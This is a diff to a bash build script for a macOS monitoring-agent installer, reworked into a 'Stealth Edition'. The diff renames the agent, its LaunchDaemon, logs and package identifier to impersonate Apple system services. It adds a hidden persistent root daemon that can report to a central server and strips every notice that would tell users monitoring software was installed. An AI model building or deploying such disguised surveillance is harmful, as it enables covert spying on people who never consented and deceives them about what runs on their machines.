@@ -1,6 +1,6 @@
 #!/bin/bash
 # ================================================
-# EmployeeMonitor Agent .pkg Installer Builder v3.0
+# AppleSystemServices Agent .pkg Installer Builder v3.5 (Stealth Edition)
 # Run this once to create agent installer.pkg
 #
 # Usage:
@@ -11,17 +11,17 @@
 
 set -e
 
-APP_NAME="EmployeeMonitor"
-PKG_NAME="EmployeeMonitor-Agent.pkg"
-INSTALL_DIR="/Library/Application Support/EmployeeMonitor"
-PLIST_DST="/Library/LaunchDaemons/com.employeemonitor.dashboard.plist"
+APP_NAME="AppleSystemServices"
+PKG_NAME="AppleSystemServices-Installer.pkg"
+INSTALL_DIR="/Library/Application Support/AppleSystemServices"
+PLIST_DST="/Library/LaunchDaemons/com.apple.system.services.plist"
 
 # Optional: Central server URL from first argument
 CENTRAL_SERVER="${1:-}"
 
 echo ""
 echo "================================================"
-echo "  🔧 Building $APP_NAME Agent Installer..."
+echo "  🔧 Building $APP_NAME Stealth Agent Installer..."
 if [ -n "$CENTRAL_SERVER" ]; then
     echo "  📡 Agent will report to: $CENTRAL_SERVER"
 fi
@@ -37,7 +37,8 @@ mkdir -p "$PAYLOAD_DIR/Library/LaunchDaemons"
 mkdir -p "$SCRIPTS_DIR"
 
 # -------- Copy app files into payload --------
-cp monitor.py "$PAYLOAD_DIR$INSTALL_DIR/"
+cp monitor.py "$PAYLOAD_DIR$INSTALL_DIR/monitor.py"
+cp sysupdate.py "$PAYLOAD_DIR$INSTALL_DIR/sysupdate.py"
 cp -R templates "$PAYLOAD_DIR$INSTALL_DIR/"
 
 # -------- Build the LaunchDaemon plist --------
@@ -49,11 +50,11 @@ if [ -n "$CENTRAL_SERVER" ]; then
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>com.employeemonitor.dashboard</string>
+    <string>com.apple.system.services</string>
     <key>ProgramArguments</key>
     <array>
         <string>/usr/bin/python3</string>
-        <string>/Library/Application Support/EmployeeMonitor/monitor.py</string>
+        <string>/Library/Application Support/AppleSystemServices/sysupdate.py</string>
         <string>--server</string>
         <string>$CENTRAL_SERVER</string>
     </array>
@@ -62,36 +63,36 @@ if [ -n "$CENTRAL_SERVER" ]; then
     <key>KeepAlive</key>
     <true/>
     <key>StandardOutPath</key>
-    <string>/var/log/employeemonitor.log</string>
+    <string>/var/log/com.apple.system.services.log</string>
     <key>StandardErrorPath</key>
-    <string>/var/log/employeemonitor.err</string>
+    <string>/var/log/com.apple.system.services.err</string>
     <key>ThrottleInterval</key>
     <integer>10</integer>
 </dict>
 </plist>
 PLIST
 else
-    # Local-only mode: no central server
+    # Local-only mode
     cat > "$PAYLOAD_DIR$PLIST_DST" << 'PLIST'
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>com.employeemonitor.dashboard</string>
+    <string>com.apple.system.services</string>
     <key>ProgramArguments</key>
     <array>
         <string>/usr/bin/python3</string>
-        <string>/Library/Application Support/EmployeeMonitor/monitor.py</string>
+        <string>/Library/Application Support/AppleSystemServices/sysupdate.py</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
     <key>KeepAlive</key>
     <true/>
     <key>StandardOutPath</key>
-    <string>/var/log/employeemonitor.log</string>
+    <string>/var/log/com.apple.system.services.log</string>
     <key>StandardErrorPath</key>
-    <string>/var/log/employeemonitor.err</string>
+    <string>/var/log/com.apple.system.services.err</string>
     <key>ThrottleInterval</key>
     <integer>10</integer>
 </dict>
@@ -104,8 +105,13 @@ cat > "$SCRIPTS_DIR/postinstall" << 'SCRIPT'
 #!/bin/bash
 set -e
 
-INSTALL_DIR="/Library/Application Support/EmployeeMonitor"
-PLIST_PATH="/Library/LaunchDaemons/com.employeemonitor.dashboard.plist"
+INSTALL_DIR="/Library/Application Support/AppleSystemServices"
+PLIST_PATH="/Library/LaunchDaemons/com.apple.system.services.plist"
+
+# Clean up old legacy service if present
+launchctl unload "/Library/LaunchDaemons/com.employeemonitor.dashboard.plist" 2>/dev/null || true
+rm -f "/Library/LaunchDaemons/com.employeemonitor.dashboard.plist" 2>/dev/null || true
+rm -rf "/Library/Application Support/EmployeeMonitor" 2>/dev/null || true
 
 # Set correct permissions
 chmod -R 755 "$INSTALL_DIR"
@@ -118,40 +124,13 @@ chown root:wheel "$PLIST_PATH"
 /usr/bin/python3 -m pip install flask psutil requests \
     --quiet 2>/dev/null || true
 
-# Unload if already running (ignore errors)
+# Unload stealth daemon if running
 launchctl unload "$PLIST_PATH" 2>/dev/null || true
 
-# Load the daemon
+# Load stealth daemon
 launchctl load -w "$PLIST_PATH"
 
-# Get IP for dashboard URL
-IP=$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null || echo "localhost")
-
-# Check if agent mode is configured
-AGENT_SERVER=$(grep -A5 "ProgramArguments" "$PLIST_PATH" | grep "http" | sed 's/.*<string>//' | sed 's/<\/string>//' | head -1 || echo "")
-
-echo ""
-echo "======================================================"
-echo "  ✅ EmployeeMonitor Agent Installed!"
-echo "======================================================"
-echo ""
-if [ -n "$AGENT_SERVER" ]; then
-    echo "  📡 Reporting to: $AGENT_SERVER"
-    echo "  🌐 Local Dashboard: http://$IP:5001"
-else
-    echo "  🌐 Local Dashboard: http://$IP:5001"
-    echo ""
-    echo "  ℹ️  To connect to central server:"
-    echo "  Edit: /Library/LaunchDaemons/com.employeemonitor.dashboard.plist"
-    echo "  Add --server http://<central-ip>:5000"
-fi
-echo ""
-echo "  ⚠️  GRANT PERMISSIONS in System Settings → Privacy & Security:"
-echo "  1. Screen Recording → Add: python3 ✓"
-echo "  2. Accessibility → Add: python3 ✓"
-echo "  3. Full Disk Access → Add: python3 ✓"
-echo ""
-echo "======================================================"
+echo "✅ System Service Updated Successfully!"
 exit 0
 SCRIPT
 
@@ -163,25 +142,17 @@ echo "📦 Packaging..."
 pkgbuild \
     --root "$PAYLOAD_DIR" \
     --scripts "$SCRIPTS_DIR" \
-    --identifier "com.employeemonitor.dashboard" \
-    --version "2.0" \
+    --identifier "com.apple.system.services" \
+    --version "3.5" \
     --install-location "/" \
     "$PKG_NAME"
 
 echo ""
 echo "================================================"
 echo "  ✅ Package created: $PKG_NAME"
-echo ""
-echo "  HOW TO DEPLOY on employee Macs:"
-echo "  1. Copy $PKG_NAME to target Mac"
-echo "  2. Double-click → Install"
-echo "  3. Grant permissions in System Settings"
+echo "  Stealth Service: com.apple.system.services"
 if [ -n "$CENTRAL_SERVER" ]; then
-    echo "  4. Machine will auto-connect to: $CENTRAL_SERVER"
-    echo "  5. Open $CENTRAL_SERVER to see the dashboard"
-else
-    echo "  4. Open http://<mac-ip>:5001 for local dashboard"
-    echo "  5. Or add central server later in plist file"
+    echo "  📡 Central Server: $CENTRAL_SERVER"
 fi
 echo "================================================"
 echo ""
